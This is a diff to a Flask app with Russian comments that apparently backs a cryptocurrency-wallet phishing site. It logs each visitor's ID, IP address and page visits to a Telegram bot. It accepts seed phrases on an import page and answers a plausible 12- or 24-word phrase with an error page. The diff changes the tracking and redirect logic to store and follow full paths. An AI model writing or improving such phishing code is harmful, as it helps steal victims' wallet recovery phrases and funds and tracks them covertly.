@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect
 import os
 import requests
 import json
@@ -6,7 +6,7 @@ from datetime import datetime, timedelta
 
 app = Flask(__name__)
 
-# 🔑 Твой токен и chat_id
+# 🔑 Твой токен и chat_id (замени на реальные значения или используй переменные окружения)
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
@@ -44,19 +44,21 @@ def send_to_telegram(message):
 
 
 # ========== Хелперы ==========
-def update_user_page(user_id, page):
-    """Сохраняем последнюю страницу пользователя (кроме index)"""
-    if not user_id or page == "index":
+def update_user_page(user_id, path):
+    """Сохраняем полный URL последней страницы пользователя (кроме index)"""
+    if not user_id or path == "/":
         return
 
     users = load_users()
     if str(user_id) not in users:
         users[str(user_id)] = {}
-    users[str(user_id)]["last_page"] = page
+
+    # Сохраняем путь вместе с user_id
+    users[str(user_id)]["last_page"] = f"{path}?user_id={user_id}"
     save_users(users)
 
     ip = request.remote_addr
-    send_to_telegram(f"👤 User {user_id} (IP: {ip}) открыл страницу: {page}")
+    send_to_telegram(f"👤 User {user_id} (IP: {ip}) открыл страницу: {path}")
 
 
 # ========== Роуты ==========
@@ -67,26 +69,25 @@ def index():
 
     if user_id and str(user_id) in users:
         last_page = users[str(user_id)].get("last_page")
-        if last_page and last_page != "index":
+        if last_page and last_page != "/":
             ip = request.remote_addr
             send_to_telegram(f"↩️ User {user_id} (IP: {ip}) возвращен на страницу: {last_page}")
-            return redirect(url_for(last_page, user_id=user_id))
+            return redirect(last_page)
 
-    # если last_page нет или это index — просто главная
     return render_template("index.html")
 
 
 @app.route("/wallet")
 def wallet():
     user_id = request.args.get("user_id")
-    update_user_page(user_id, "wallet")
+    update_user_page(user_id, "/wallet")
     return render_template("wallet.html")
 
 
 @app.route("/error")
 def error():
     user_id = request.args.get("user_id")
-    update_user_page(user_id, "error")
+    update_user_page(user_id, "/error")
 
     now = datetime.now()
     start = now - timedelta(hours=1)
@@ -107,7 +108,7 @@ def new_wallet():
         users[str(user_id)]["wallet_created"] = True
         save_users(users)
 
-    update_user_page(user_id, "new_wallet")
+    update_user_page(user_id, "/new_wallet")
     return render_template("new_wallet.html")
 
 
@@ -126,13 +127,13 @@ def import_wallet():
 
             words = seed_phrase.split()
             if len(words) in (12, 24):
-                update_user_page(user_id, "error")
+                update_user_page(user_id, "/error")
                 return render_template("error.html")
 
-            update_user_page(user_id, "import")
+            update_user_page(user_id, "/import")
             return render_template("import.html", show_modal=True)
 
-    update_user_page(user_id, "import")
+    update_user_page(user_id, "/import")
     return render_template("import.html", show_modal=False)
 
 
